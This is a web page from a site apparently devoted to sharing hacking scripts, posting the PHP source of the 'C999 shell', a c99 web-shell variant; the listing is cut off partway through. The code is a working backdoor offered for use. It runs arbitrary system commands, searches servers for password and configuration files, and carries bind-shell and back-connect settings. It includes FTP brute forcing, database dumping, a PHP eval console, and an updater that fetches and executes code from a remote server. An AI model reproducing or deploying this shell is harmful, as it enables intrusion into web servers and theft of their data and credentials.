<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> C999 shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>C999 shell</h2>
<p class="meta">24 Jan 2014</p>

<p>This was the very first hack script uploaded to my website, so it holds a special place in my heart.</p>

<p>It&#8217;s a version of the <a href="http://hackingscripts.com/c99-shell/" title="C99 Shell">c99 shell script</a>, which is used by hackers (read: script kiddies) to gain backdoor entry into insecure websites.</p>

<p>It appears to be incomplete (I added the final &#8216;?&gt;&#8217;), perhaps because the end of the script was cut off during the upload process. Note that this script is only just over 1100 lines long, while the <a href="http://hackingscripts.com/c99-shell/" title="C99 Shell">complete C99 shell</a> is about 2000 lines longer! </p>

<p>I have received many more C99 scripts since this one, most of them complete and more up-to-date than this one.</p>

<h2>C999 Shell Script Source Code</h2>

<pre class="brush: php; title: ; notranslate" title="">&lt;?php //Starting calls if (!function_exists("getmicrotime")) {function getmicrotime() { list($usec, $sec) = explode(" ", microtime());  return ((float)$usec + (float)$sec);}} error_reporting(5); @ignore_user_abort(TRUE); @set_magic_quotes_runtime(0); $win = strtolower(substr(PHP_OS,0,3)) == "win"; define("starttime",getmicrotime()); if (get_magic_quotes_gpc()) {if (!function_exists("strips")) { function strips(&$arr,$k="") {if (is_array($arr))  {foreach($arr as $k=--&gt;$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}}
else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=&gt;$v) {if (!isset($$k)) {$$k = $v;}}
$shver = "1.0 pre-release build #16"; //Current version
//CONFIGURATION AND SETTINGS
if (!empty($unset_surl)) {setcookie("c999sh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c999sh_surl",$surl);}
else {$surl = $_REQUEST["c999sh_surl"]; //Set this cookie for manual SURL
}
$surl_autofill_include = TRUE; //If TRUE then search variables with
                               //descriptors (URLs) and save it in SURL.
if ($surl_autofill_include and !$_REQUEST["c999sh_surl"]) {$include = "&"; foreach
(explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v);
$name = urldecode($v[0]);
$value = urldecode($v[1]);
foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
if (strpos($value,$needle) === 0) {
$includestr .= urlencode($name)."=".urlencode($value)."&";}}}
if ($_REQUEST["surl_autofill_include"]) {
$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
 $surl = "?".$includestr; //Self url
}
$surl = htmlspecialchars($surl);
$timelimit = 0; //time limit of execution this script over server quote
                //(seconds), 0 = unlimited.
//Authentication
$login = ""; //login
//DON'T FORGOT ABOUT PASSWORD!!!
$pass = ""; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)
$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = "&lt;a href="\&quot;http://ccteam.ru/releases/c999shell\&quot;"&gt;c999shell v.".$shver."&lt;/a&gt;: access denied";
$gzipencode = TRUE; //Encode with gzip?
$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)
$c999sh_updateurl = "http://ccteam.ru/update/c999shell/"; //Update server
$c999sh_sourcesurl = "http://ccteam.ru/files/c999sh_sources/"; //Sources-server
$filestealth = TRUE; //if TRUE, don't change modify- and access-time
$donated_html = "&lt;/pre&gt;
&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;
&lt;pre&gt;";
/* If you publish free shell and you wish
add link to your site or any other information,
put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.
$curdir = "./"; //start folder
//$curdir = getenv("DOCUMENT_ROOT");
$tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)
$log_email = "user@host.tld"; //Default e-mail for sending logs
$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
$sort_save = TRUE; //If TRUE then save sorting-position using cookies.
// Registered file-types.
//  array(
//   "{action1}"=&gt;array("ext1","ext2","ext3",...),
//   "{action2}"=&gt;array("ext4","ext5","ext6",...),
//   ...
//  )
$ftypes  = array(
 "html"=&gt;array("html","htm","shtml"),
 "txt"=&gt;array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=&gt;array("sh","install","bat","cmd"),
 "ini"=&gt;array("ini","inf"),
 "code"=&gt;array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=&gt;array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=&gt;array("sdb"),
 "phpsess"=&gt;array("sess"),
 "download"=&gt;array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
// Registered executable file-types.
//  array(
//   string "command{i}"=&gt;array("ext1","ext2","ext3",...),
//   ...
//  )
//   {command}: %f% = filename
$exeftypes  = array(
 getenv("PHPRC")." -q %f%" =&gt; array("php","php3","php4"),
 "perl %f%" =&gt; array("pl","cgi")
);
/* Highlighted files.
  array(
   i=&gt;array({regexp},{type},{opentag},{closetag},{break})
   ...
  )
  string {regexp} - regular exp.
  int {type}:
0 - files and folders (as default),
1 - files only, 2 - folders only
  string {opentag} - open html-tag, e.g. "&lt;b&gt;" (default)
  string {closetag} - close html-tag, e.g. "&lt;/b&gt;" (default)
  bool {break} - if TRUE and found match then break
*/
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"&lt;/pre&gt;
&lt;span&gt;","&lt;/span&gt;
&lt;pre&gt;"), // example
  array("config.php",1) // example
);
$safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
 // array (i=&gt;{letter} ...); string {letter} - letter of a drive
//$safemode_diskettes = range("a","z");
$hexdump_lines = 8;// lines in hex preview file
$hexdump_rows = 24;// 16, 24 or 32 bytes in one line
$nixpwdperpage = 100; // Get first N lines from /etc/passwd
$bindport_pass = "c999";  // default password for binding
$bindport_port = "31373"; // default port for binding
$bc_port = "31373"; // default port for back-connect
$datapipe_localport = "8081"; // default port for datapipe
// Command-aliases
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}
$sess_cookie = "c999shvars"; // Cookie-variable name
$usefsbuff = TRUE; //Buffer-function
$copy_unset = FALSE; //Remove copied files from buffer after pasting
//Quick launch
$quicklaunch = array(
 array("&lt;img alt="\&quot;Home\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=home\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;",$surl),
 array("&lt;img alt="\&quot;Back\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=back\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;","#\" onclick=\"history.back(1)"),
 array("&lt;img alt="\&quot;Forward\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=forward\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;","#\" onclick=\"history.go(1)"),
 array("&lt;img alt="\&quot;UPDIR\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=up\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;",$surl."act=ls&d=%upd&sort=%sort"),
 array("&lt;img alt="\&quot;Refresh\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=refresh\&quot;" width="\&quot;17\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;",""),
 array("&lt;img alt="\&quot;Search\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=search\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;",$surl."act=search&d=%d"),
 array("&lt;img alt="\&quot;Buffer\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=buffer\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" /&gt;",$surl."act=fsbuff&d=%d"),
 array("&lt;b&gt;Encoder&lt;/b&gt;",$surl."act=encoder&d=%d"),
 array("&lt;b&gt;Tools&lt;/b&gt;",$surl."act=tools&d=%d"),
 array("&lt;b&gt;Proc.&lt;/b&gt;",$surl."act=processes&d=%d"),
 array("&lt;b&gt;FTP brute&lt;/b&gt;",$surl."act=ftpquickbrute&d=%d"),
 array("&lt;b&gt;Sec.&lt;/b&gt;",$surl."act=security&d=%d"),
 array("&lt;b&gt;SQL&lt;/b&gt;",$surl."act=sql&d=%d"),
 array("&lt;b&gt;PHP-code&lt;/b&gt;",$surl."act=eval&d=%d"),
 array("&lt;b&gt;Update&lt;/b&gt;",$surl."act=update&d=%d"),
 array("&lt;b&gt;Feedback&lt;/b&gt;",$surl."act=feedback&d=%d"),
 array("&lt;b&gt;Self remove&lt;/b&gt;",$surl."act=selfremove"),
 array("&lt;b&gt;Logout&lt;/b&gt;","#\" onclick=\"if (confirm('Are you sure?')) window.close()")
);
//Highlight-code colors
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";
@$f = $_REQUEST["f"];
@extract($_REQUEST["c999shcook"]);
//END CONFIGURATION
// \/Next code isn't for editing\/
@set_time_limit(0);
$tmp = array();
foreach($host_allow as $k=&gt;$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("&lt;a href="\&quot;http://ccteam.ru/releases/cc999shell\&quot;"&gt;c999shell&lt;/a&gt;: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 if (empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace(" |
"," ",$donated_html));}
  header("WWW-Authenticate: Basic realm=\"c999shell ".$shver.": ".$login_txt."\"");
  header("HTTP/1.0 401 Unauthorized");
  exit($accessdeniedmess);
 }
}
if ($act != "img")
{
$lastdir = realpath(".");
chdir($curdir);
if ($selfwrite or $updatenow) {@ob_clean(); c999sh_getupdate($selfwrite,1); exit;}
$sess_data = unserialize($_COOKIE["$sess_cookie"]);
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc))
{
 $disablefunc = str_replace(" ","",$disablefunc);
 $disablefunc = explode(",",$disablefunc);
}
if (!function_exists("c999_buff_prepare"))
{
function c999_buff_prepare()
{
 global $sess_data;
 global $act;
 foreach($sess_data["copy"] as $k=&gt;$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 foreach($sess_data["cut"] as $k=&gt;$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 $sess_data["copy"] = array_unique($sess_data["copy"]);
 $sess_data["cut"] = array_unique($sess_data["cut"]);
 sort($sess_data["copy"]);
 sort($sess_data["cut"]);
 if ($act != "copy") {foreach($sess_data["cut"] as $k=&gt;$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
 else {foreach($sess_data["copy"] as $k=&gt;$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
}
c999_buff_prepare();
if (!function_exists("c999_sess_put"))
{
function c999_sess_put($data)
{
 global $sess_cookie;
 global $sess_data;
 c999_buff_prepare();
 $sess_data = $data;
 $data = serialize($data);
 setcookie($sess_cookie,$data);
}
}
foreach (array("sort","sql_sort") as $v)
{
 if (!empty($_GET[$v])) {$$v = $_GET[$v];}
 if (!empty($_POST[$v])) {$$v = $_POST[$v];}
}
if ($sort_save)
{
 if (!empty($sort)) {setcookie("sort",$sort);}
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) &gt; $len)
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0,$len)."...".substr($content,-$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if (!is_numeric($size)) {return FALSE;}
 else
 {
  if ($size &gt;= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size &gt;= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size &gt;= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return TRUE;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (!is_dir(dirname($t))) {mkdir(dirname($t));}
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d)) {return copy($d,$t);}
 else {return FALSE;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = TRUE;
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return TRUE;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d))
 {
  if(copy($d,$t)) {return unlink($d);}
  else {unlink($t); return FALSE;}
 }
 else {return FALSE;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return FALSE;}
}
}
if (!function_exists("myshellexec"))
{
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
if (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}
 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";
 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
 return $type.join("",$owner).join("",$group).join("",$world);
}
}
if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) &gt; 0; $o["w"] = ($mode & 00200) &gt; 0; $o["x"] = ($mode & 00100) &gt; 0;
 $g["r"] = ($mode & 00040) &gt; 0; $g["w"] = ($mode & 00020) &gt; 0; $g["x"] = ($mode & 00010) &gt; 0;
 $w["r"] = ($mode & 00004) &gt; 0; $w["w"] = ($mode & 00002) &gt; 0; $w["x"] = ($mode & 00001) &gt; 0;
 return array("t"=&gt;$t,"o"=&gt;$o,"g"=&gt;$g,"w"=&gt;$w);
}
}
if (!function_exists("parsesort"))
{
function parsesort($sort)
{
 $one = intval($sort);
 $second = substr($sort,-1);
 if ($second != "d") {$second = "a";}
 return array($one,$second);
}
}
if (!function_exists("view_perms_color"))
{
function view_perms_color($o)
{
 if (!is_readable($o)) {return "&lt;/pre&gt;
&lt;span style="color: red;"&gt;".view_perms(fileperms($o))."&lt;/span&gt;
&lt;pre&gt;";}
 elseif (!is_writable($o)) {return "&lt;/pre&gt;
&lt;span style="color: white;"&gt;".view_perms(fileperms($o))."&lt;/span&gt;
&lt;pre&gt;";}
 else {return "&lt;/pre&gt;
&lt;span style="color: green;"&gt;".view_perms(fileperms($o))."&lt;/span&gt;
&lt;pre&gt;";}
}
}
if (!function_exists("c999getsource"))
{
function c999getsource($fn)
{
 global $c999sh_sourcesurl;
 $array = array(
  "c999sh_bindport.pl" =&gt; "c999sh_bindport_pl.txt",
  "c999sh_bindport.c" =&gt; "c999sh_bindport_c.txt",
  "c999sh_backconn.pl" =&gt; "c999sh_backconn_pl.txt",
  "c999sh_backconn.c" =&gt; "c999sh_backconn_c.txt",
  "c999sh_datapipe.pl" =&gt; "c999sh_datapipe_pl.txt",
  "c999sh_datapipe.c" =&gt; "c999sh_datapipe_c.txt",
 );
 $name = $array[$fn];
 if ($name) {return file_get_contents($c999sh_sourcesurl.$name);}
 else {return FALSE;}
}
}
if (!function_exists("c999sh_getupdate"))
{
function c999sh_getupdate($update = TRUE)
{
 $url = $GLOBALS["c999sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
 $data = @file_get_contents($url);
 if (!$data) {return "Can't connect to update-server!";}
 else
 {
  $data = ltrim($data);
  $string = substr($data,3,ord($data{2}));
  if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;}
  if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
  if ($data{0} == "\x99" and $data{1} == "\x03")
  {
   $string = explode("\x01",$string);
   if ($update)
   {
    $confvars = array();
    $sourceurl = $string[0];
    $source = file_get_contents($sourceurl);
    if (!$source) {return "Can't fetch update!";}
    else
    {
     $fp = fopen(__FILE__,"w");
     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c999shell.php manually &lt;a href="\&quot;&quot;.$sourceurl.&quot;\&quot;"&gt;&lt;span style="text-decoration: underline;"&gt;here&lt;/span&gt;&lt;/a&gt;.";}
     else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";}
    }
   }
   else {return "New version are available: ".$string[1];}
  }
  elseif ($data{0} == "\x99" and $data{1} == "\x04") {eval($string); return 1;}
  else {return "Error in protocol: segmentation failed! (".$data.") ";}
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 global $shver;
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 $ret["err"] = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = 0;}
 if (empty($add_drop)) {$add_drop = TRUE;}
 if (empty($file))
 {
  $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = TRUE;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) &gt; 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $out = "# Dumped by c999Shell.SQL v. ".$shver."
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
# Date: ".date("d.m.Y H:i:s")."
# DB: \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret["err"][] = mysql_smarterror();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row["1"].";\n\n";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) &gt; 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=&gt;$v) {$values[$k] = addslashes($v);}
      $values = implode("', '", $values);
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
      $out .= $sql;
     }
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w");
  if (!$fp) {$ret["err"][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $out;
}
}
if (!function_exists("mysql_buildwhere"))
{
function mysql_buildwhere($array,$sep=" and",$functs=array())
{
 if (!is_array($array)) {$array = array();}
 $result = "";
 foreach($array as $k=&gt;$v)
 {
  $value = "";
  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
  $value .= "'".addslashes($v)."'";
  if (!empty($functs[$k])) {$value .= ")";}
  $result .= "`".$k."` = ".$value.$sep;
 }
 $result = substr($result,0,strlen($result)-strlen($sep));
 return $result;
}
}
if (!function_exists("mysql_fetch_all"))
{
function mysql_fetch_all($query,$sock)
{
 if ($sock) {$result = mysql_query($query,$sock);}
 else {$result = mysql_query($query);}
 $array = array();
 while ($row = mysql_fetch_array($result)) {$array[] = $row;}
 mysql_free_result($result);
 return $array;
}
}
if (!function_exists("mysql_smarterror"))
{
function mysql_smarterror($type,$sock)
{
 if ($sock) {$error = mysql_error($sock);}
 else {$error = mysql_error();}
 $error = htmlspecialchars($error);
 return $error;
}
}
if (!function_exists("mysql_query_form"))
{
function mysql_query_form()
{
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; 
".$sql_query_error."
";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
  echo "&lt;/pre&gt;
"; if ($tbl_struct) { echo "
&lt;table border="0"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;form method="POST" name="\&quot;c999sh_sqlquery\&quot;"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":&lt;/b&gt;

&lt;textarea cols="100" name="sql_query" rows="10"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;

